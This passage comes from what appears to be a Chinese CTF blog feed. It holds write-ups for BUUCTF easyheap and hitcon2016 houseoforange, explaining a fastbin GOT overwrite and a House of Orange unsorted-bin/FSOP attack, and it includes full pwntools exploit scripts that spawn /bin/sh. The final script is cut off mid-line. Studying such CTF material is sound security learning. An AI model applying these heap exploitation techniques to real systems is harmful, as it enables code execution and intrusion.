src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/BUUCTF-easyheap/IDA-edit.png"><br>发现在edit的时候又询问了一次堆块长度，因此这里存在溢出<br><br>最后再看一下delete，free后会置空，没有UAF：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/BUUCTF-easyheap/IDA-delete.png"></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>找到了溢出漏洞点，首先想办法拿任意地址写<br><br>思路为：申请超过1个的堆块，free掉后面几个，然后溢出第一个堆块去改后面堆块的fd指针，然后再malloc<br><br>但是这里需要注意fast bin的检查机制，主要如下所示：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> victim_idx = fastbin_index (chunksize (victim));<br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (victim_idx != idx))<br>malloc_printerr (<span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>);<br>      check_remalloced_chunk (av, victim, nb);<br></code></pre></td></tr></table></figure><p>可以看到，fast bin在申请时，会检查 <em><strong>size字段是否属于当前bin规定的大小</strong></em> ，因此我们需要先办法用一次字节错位去伪造大小；同时，要注意 <em><strong>fast bin的fd指针，应该是指向chunk的头部，而不是数据区的头部</strong></em> <br><br>至于如何找错位字节，需要动态调试，如下图所示，想办法在heaparray上方找到了一个0x7f的错位字节：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/BUUCTF-easyheap/fake-size-byte.png"><br>而且可以看到这里的0x7f是标准输入输出的地址，一般不会改变，因此我们可以malloc到heaparray上方，然后溢出覆盖heaparray实现任意地址写<br><br>ok，拿到了任意地址写，但具体该写哪里？<br>首先注意到main函数里有一个magic变量，位于bss段，如果该变量校验正确会调用一个l33t函数，发现这个函数会执行一个类似cat flag的命令，如图：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/BUUCTF-easyheap/IDA-l33t.png"><br>于是考虑覆盖bss段的magic去通过检查，但是经过打远程发现，这个路径是错误的，没有flag，看来这是一个假的后门函数<br><br>接下来考虑直接拿shell，这里注意checksec中的结果为Partial RELRO，考虑覆盖GOT表<br><br>至于覆盖哪个函数，由于能输入控制的地方是heaparray数组，而恰好free函数以该处指针作为第一个参数<br><br>因此首先在0x6020ad错位字节malloc一个chunk，然后覆盖heaparray第一次任意地址写free函数的GOT表；<br><br>第二次任意地址将heaparray+1的地方填入&#x2F;bin&#x2F;sh<br><br>最后再free掉1号堆块<br><br>最终的exp如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;amd64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;/home/k40/Pwn/Exercise/EasyHeap/easyheap&quot;</span><br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br>LOCAL=<span class="hljs-number">1</span><br>REMOTE=<span class="hljs-number">2</span><br>DEBUG=<span class="hljs-number">3</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Lauch</span>(<span class="hljs-params">mode=LOCAL</span>):<br>    <span class="hljs-keyword">if</span> mode==LOCAL:<br>        io=process(targetELF)<br>        <span class="hljs-keyword">return</span> io<br>    <span class="hljs-keyword">elif</span> mode==REMOTE:<br>        io=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29633</span>)<br>        <span class="hljs-keyword">return</span> io<br>    <span class="hljs-keyword">elif</span> mode==DEBUG:<br>        io=gdb.debug(targetELF)<br>        <span class="hljs-keyword">return</span> io<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">CreateHeap</span>(<span class="hljs-params">io,size,payload=<span class="hljs-string">&quot;AAA&quot;</span></span>):<br>    io.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    io.send(<span class="hljs-string">&quot;1&quot;</span>)<br>    io.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>    io.send(<span class="hljs-built_in">str</span>(size))<br>    io.recvuntil(<span class="hljs-string">&quot;Content of heap:&quot;</span>)<br>    io.send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">EditHeap</span>(<span class="hljs-params">io,index,size,payload=<span class="hljs-string">b&#x27;\x00&#x27;</span></span>):<br>    io.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    io.send(<span class="hljs-string">&quot;2&quot;</span>)<br>    io.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>    io.send(<span class="hljs-built_in">str</span>(index))<br>    io.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>    io.send(<span class="hljs-built_in">str</span>(size))<br>    io.recvuntil(<span class="hljs-string">&quot;Content of heap : &quot;</span>)<br>    io.send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">DeleteHeap</span>(<span class="hljs-params">io,index</span>):<br>    io.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    io.send(<span class="hljs-string">&quot;3&quot;</span>)<br>    io.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>    io.send(<span class="hljs-built_in">str</span>(index))<br><br>elf=ELF(targetELF)<br>systemPLT=elf.plt[<span class="hljs-string">&quot;system&quot;</span>]<br>freeGOT=elf.got[<span class="hljs-string">&quot;free&quot;</span>]<br><br>ioTube=Lauch(DEBUG)<br><br>CreateHeap(ioTube,<span class="hljs-number">0x60</span>)<br>CreateHeap(ioTube,<span class="hljs-number">0x60</span>)<br>CreateHeap(ioTube,<span class="hljs-number">0x60</span>)<br><br>DeleteHeap(ioTube,<span class="hljs-number">2</span>)<br>DeleteHeap(ioTube,<span class="hljs-number">1</span>)<br><br>payload=<span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">0x60</span>+<span class="hljs-number">0x8</span>)+p64(<span class="hljs-number">0x7f</span>)+p64(<span class="hljs-number">0x6020ad</span>)<br>EditHeap(ioTube,<span class="hljs-number">0</span>,<span class="hljs-number">0x78</span>,payload)<br><br><br>CreateHeap(ioTube,<span class="hljs-number">0x60</span>)<br>CreateHeap(ioTube,<span class="hljs-number">0x60</span>)<br><br>payload=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">35</span>+p64(freeGOT)<br>EditHeap(ioTube,<span class="hljs-number">2</span>,<span class="hljs-number">59</span>,payload)<br><br>EditHeap(ioTube,<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(systemPLT))<br>EditHeap(ioTube,<span class="hljs-number">1</span>,<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br><br>DeleteHeap(ioTube,<span class="hljs-number">1</span>)<br>ioTube.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>其他技巧类</category>
      
      <category>覆写GOT表</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>House-of-Orange</title>
    <link href="/2025/09/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Heap/House-of-orange/"/>
    <url>/2025/09/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Heap/House-of-orange/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>hitcon2016的houseoforange原题，BUU链接见：<a href="https://buuoj.cn/challenges#houseoforange_hitcon_2016">BUUCTF：houseoforange_hitcon_2016</a></p><span id="more"></span><p>这道题是house of orange技术的经典例题，通过这题加深了对top chunk、unsorted bin、large bin、IO_FILE利用等一系列技术的理解，非常值得记录</p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先题目写了ubuntu 16，确定glibc版本是2.23，接着checksec先看一下，发现保护全开：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Heap/House-of-Orange/checksec.png"><br>然后拖进IDA里分析，可以看出来是一个菜单程序，如下图：（图中都是已经恢复了部分函数和变量名的，具体如何恢复目前我只能说凭经验和输出来猜测，以后学到了好方法再记录）<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Heap/House-of-Orange/IDA-main.png"><br>主要有3个功能，分别是Build、See和Upgrade，分别对应创建堆块、输出堆块和编辑堆块的能力，进入每个函数仔细分析一下<br><br>首先看Build函数，即添加堆块的功能：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Heap/House-of-Orange/IDA-Build.png"><br>发现Build功能基本没什么问题，主要就是添加相关结构体和成员，具体的结构体视图如上图所示<br><br>另外，可以看出house结构指针存储在偏移0x203068的地方，house数量存储在偏移0x203070的地方<br><br>接下来看Upgrade函数，如图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Heap/House-of-Orange/IDA-Upgrade.png"><br>发现在更新name的时候会重新询问长度，因此这里存在溢出<br><br>最后再看一下See函数：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Heap/House-of-Orange/IDA-See.png"><br>看上去没什么问题，只是把所有字段输出出来，但是结合之前Build函数的逻辑，可以发现我们只能输出最后添加的那个house<br><br>接下来的问题是如何利用Upgrade里的溢出点，主要是题目没有给free的接口，因此要想办法能free堆块<br><br>注意到ptmalloc分配堆块的规则：所有bins无法满足的时候从top chunk取，如果top chunk也不够，会申请新的内存，然后 <em><strong>旧的top chunk会被丢到unsorted bin</strong></em> <br><br>但是实现了free之后呢？如何控制任意地址写<br><br>这里需要注意到unsorted bin的分配机制，glibc中，当fast bin、small bin、large bin都不够的时候，会从unsorted bin中取堆块，且取最末尾的堆块<br><br>当然，对于双向循环链表，不存在头尾，意会一下是取fd指向main_arena bins[1]（偏移固定，一般为main_arena+88）的那个堆块即可（即下图的chunk3）<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Heap/House-of-Orange/unsorted_bin.png"><br>对应的源码如下：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>        &#123;<br>          bck = victim-&gt;bk;<br>          …………<br>        &#125;<br><span class="hljs-comment">/* remove from unsorted list */</span><br>        unsorted_chunks (av)-&gt;bk = bck;<br>        bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><p>而如果我们能够修改最后一个堆块(chunk 3)的bk指针，指向我们想要写入的地址-16字节的位置，就能在这一步：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><p>中将main_arena+88这个值写入任意地址<br>但是写到哪里，一个思路是写到_IO_list_all，劫持IO_FILE的链表去打FSOP，但这样的话要泄露libc地址<br><br>注意当申请到一个large bin的时候，这个堆块的fd_next和bk_next会残留libc和堆块的信息，如图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Heap/House-of-Orange/large_bin-leak.png"><br>加上题目程序自定义的输入函数并不会没在最后加上0x00，如图：<br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Heap/House-of-Orange/IDA-MyScanf.png"><br>因此可以利用以上两点来泄露堆地址和libc地址，其中libc地址用于定位_IO_list_all，堆地址用于布置假的FILE和vtable<br><br>最后，如何劫持_IO_list_all？我们知道，当unsorted bin attack完成后，_IO_list_all会指向main_arena+88<br><br>首先想到我们能直接在main_arena+88的位置伪造一个假的FILE或者在main_arena+88+0xd8的位置伪造一个假的vtable吗？<br><br>不，我们尽管可以任意地址写，但写的内容是固定的，即main_arena+88，很难在任意地址伪造一个vtable<br><br>所以只能在分配给我们的House里伪造数据结构，而恰好main_arena+88+0x68，这个地方作为_IO_list_all的_chain字段，是0x60大小的small bin的区域<br><br>所以，只要我们把unsorted bin的size字段改为0x60，在下一次分配的时候，会把这个堆块放到small bin的对应位置，从而在刷新第二个IO_FILE的时候就劫持到了我们伪造的数据结构上<br><br>至此，梳理一下本题的利用思路：<br></p><ol><li>分配一个堆块，溢出修改top chunk的size字段，然后立马申请一个超大堆块，触发top chunk进入unsorted bin</li><li>申请一个large bin，调用See House功能，输出libc和堆地址</li><li>构造好包含假的FILE和vtable的payload，再次利用溢出在堆上布置好结构体</li><li>最后一次malloc，首先触发unsorted bin重新分配，被丢到small bin，然后触发error，程序abort，调用IO_flush_all_lockp，刷新假的_IO_list_all</li></ol><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>按照之前的步骤，首先溢出修改top chunk的size，然后申请大堆块，top chunk被成功丢到unsorted bin里面，如图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Heap/House-of-Orange/top_chunk-fake-size.png"><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Heap/House-of-Orange/top_chunk-in-unsorted.png"><br>这一段对应的代码为：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#1:House of Orange完成将top chunk丢进unsorted bin</span><br>BuildHouse(<span class="hljs-number">16</span>)<br><br>payload=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">24</span>+p64(<span class="hljs-number">0x21</span>)+<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">24</span>+p64(<span class="hljs-number">0xfa1</span>)<br>UpgradeHouse(<span class="hljs-number">64</span>,payload)<br>BuildHouse(<span class="hljs-number">0x1000</span>)<br></code></pre></td></tr></table></figure><p>之后分配一个large bin泄露libc和堆地址，如图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Heap/House-of-Orange/large_bin-leak.png"><br>这一部分对应的代码为：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#2：large bin泄露libc</span><br>BuildHouse(<span class="hljs-number">0x400</span>,<span class="hljs-string">&quot;12345678&quot;</span>)<br>name=SeeHouse(<span class="hljs-string">&quot;12345678&quot;</span>)<br>libcLeak=u64(name.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcBase=libcLeak-<span class="hljs-number">0x3c5188</span> <span class="hljs-comment">#固定偏移，通过gdb调试得到</span><br><br><span class="hljs-comment">#3：泄露一个堆地址，后面在堆上布置fakeFILE</span><br>UpgradeHouse(<span class="hljs-number">40</span>,<span class="hljs-string">&quot;1234567812345678&quot;</span>)<br>name=SeeHouse(<span class="hljs-string">&quot;1234567812345678&quot;</span>)<br>heapLeak=u64(name.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>libc=ELF(libcPath)<br>sysAddr=libcBase+libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>IO_list_all=libcBase+libc.symbols[<span class="hljs-string">&quot;_IO_list_all&quot;</span>]<br></code></pre></td></tr></table></figure><p>最后，布置假的FILE和vtable，并修改unsorted bin的size字段，这些都在一次payload中完成，对应的代码如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#4:最后一次malloc的时候，由于unsorted bin的bk=_IO_list_all-0x10，所以_IO_list_all的fd=unsorted bin的fd，即main_arena+某个偏移</span><br>_chain=heapLeak+<span class="hljs-number">0x410</span>+<span class="hljs-number">0x10</span>+<span class="hljs-number">0x10</span>  <span class="hljs-comment">#加0x410到存储颜色和价格的那里，再加0x20到unsorted bin头部</span><br>vtable=heapLeak+<span class="hljs-number">0x508</span>  <span class="hljs-comment">#0x430再加0xd8即vtable的偏移</span><br>fakeFILE=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>+p64(_chain)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">13</span>+p64(vtable)<br><br>payload=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x400</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">16</span>+<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>+p64(<span class="hljs-number">0x61</span>)+p64(<span class="hljs-number">0</span>)+p64(IO_list_all-<span class="hljs-number">0x10</span>)+fakeFILE+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(sysAddr)<br>UpgradeHouse(<span class="hljs-built_in">len</span>(payload),payload)<br></code></pre></td></tr></table></figure><p>最后能看到在堆上我们伪造的FILE如下图：<br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Heap/House-of-Orange/Fake-FILE.png"><br>同时伪造的vtable如下图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Heap/House-of-Orange/Fake-Vtable.png"><br>然后再看一下_IO_list_all，发现已经被修改为main_arena+88，如图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Heap/House-of-Orange/Hijack-IO_list_all.png"><br>完整的exp如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;amd64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br>libcPath=<span class="hljs-string">&quot;/home/k40/Pwn/glibc-tool/glibc-all-in-one/libs/glibc-2.23/libc.so.6&quot;</span><br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br>LOCAL=<span class="hljs-number">1</span><br>REMOTE=<span class="hljs-number">2</span><br>DEBUG=<span class="hljs-number">3</span><br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">set debug-file-directory /home/k40/Pwn/glibc-tool/glibc-all-in-one/libs/glibc-2.23/.debug</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>libc=ELF(libcPath)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Lauch</span>(<span class="hljs-params">mode=LOCAL</span>):<br>    <span class="hljs-keyword">if</span> mode==LOCAL:<br>        io=process(targetELF)<br>        <span class="hljs-keyword">return</span> io<br>    <span class="hljs-keyword">elif</span> mode==REMOTE:<br>        io=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">28197</span>)<br>        <span class="hljs-keyword">return</span> io<br>    <span class="hljs-keyword">elif</span> mode==DEBUG:<br>        io=gdb.debug(targetELF,gdbscript=gs)<br>        <span class="hljs-keyword">return</span> io<br>ioTube=Lauch(DEBUG)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">BuildHouse</span>(<span class="hljs-params">nameSize_,name_=<span class="hljs-string">&quot;AAA&quot;</span>,price_=<span class="hljs-number">12</span>,color_=<span class="hljs-number">1</span></span>):<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Your choice : &quot;</span>)<br>    ioTube.send(<span class="hljs-string">&quot;1&quot;</span>)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Length of name :&quot;</span>)<br>    ioTube.send(<span class="hljs-built_in">str</span>(nameSize_))<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Name :&quot;</span>)<br>    ioTube.send(name_)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Price of Orange:&quot;</span>)<br>    ioTube.send(<span class="hljs-built_in">str</span>(price_))<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Color of Orange:&quot;</span>)<br>    ioTube.send(<span class="hljs-built_in">str</span>(color_))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">SeeHouse</span>(<span class="hljs-params">prefix</span>):<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Your choice : &quot;</span>)<br>    ioTube.send(<span class="hljs-string">&quot;2&quot;</span>)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Name of house : &quot;</span>+prefix)<br>    name_=ioTube.recvline()[:-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> name_<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">UpgradeHouse</span>(<span class="hljs-params">nameSize_,name_,price_=<span class="hljs-number">21</span>,color_=<span class="hljs-number">4</span></span>):<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Your choice : &quot;</span>)<br>    ioTube.send(<span class="hljs-string">&quot;3&quot;</span>)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Length of name :&quot;</span>)<br>    ioTube.send(<span class="hljs-built_in">str</span>(nameSize_))<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Name:&quot;</span>)<br>    ioTube.send(name_)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Price of Orange: &quot;</span>)<br>    ioTube.send(<span class="hljs-built_in">str</span>(price_))<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Color of Orange: &quot;</span>)<br>    ioTube.send(<span class="hljs-built_in">str</span>(color_))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">GiveUp</span>():<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Your choice : &quot;</span>)<br>    ioTube.send(<span class="hljs-string">&quot;4&quot;</span>)<br><br><span class="hljs-comment">#1:House of Orange完成将top chunk丢进unsorted bin</span><br>BuildHouse(<span class="hljs-number">16</span>)<br><br>payload=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">24</span>+p64(<span class="hljs-number">0x21</span>)+<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">24</span>+p64(<span class="hljs-number">0xfa1</span>)<br>UpgradeHouse(<span class="hljs-number">64</span>,payload)<br>BuildHouse(<span class="hljs-number">0x1000</span>)<br><br><span class="hljs-comment">#2：large bin泄露libc</span><br>BuildHouse(<span class="hljs-number">0x400</span>,<span class="hljs-string">&quot;12345678&quot;</span>)<br>name=SeeHouse(<span class="hljs-string">&quot;12345678&quot;</span>)<br>libcLeak=u64(name.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcBase=libcLeak-<span class="hljs-number">0x3c5188</span> <span class="hljs-comment">#固定偏移，通过gdb调试得到</span><br><br><span class="hljs-comment">#3：泄露一个堆地址，后面在堆上布置fakeFILE</span><br>UpgradeHouse(<span class="hljs-number">40</span>,<span class="hljs-string">&quot;1234567812345678&quot;</span>)<br>name=SeeHouse(<span class="hljs-string">&quot;1234567812345678&quot;</span>)<br>heapLeak=u64(name.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>libc=ELF(libcPath)<br>sysAddr=libcBase+libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>IO_list_all=libcBase+libc.symbols[<span class="hljs-string">&quot;_IO_list_all&quot;</span>]<br><br><span class="hljs-comment">#4:最后一次malloc的时候，由于unsorted bin的bk=_IO_list_all-0x10，所以_IO_list_all的fd=unsorted bin的fd，即main_arena+某个偏移</span><br>_chain=heapLeak+<span class="hljs-number">0x410</span>+<span class="hljs-number">0x10</span>+<span class="hljs-number">0x10</span>  <span class="hljs-comment">#加0x410到存储颜色和价格的那里，再加0x20到unsorted bin头部</span><br>vtable=heapLeak+<span class="hljs-number">0x508</span>  <span class="hljs-comment">#0x430再加0xd8即vtable的偏移</span><br>fakeFILE=p64(<span class="hljs-number">0</span>)+p64(<span 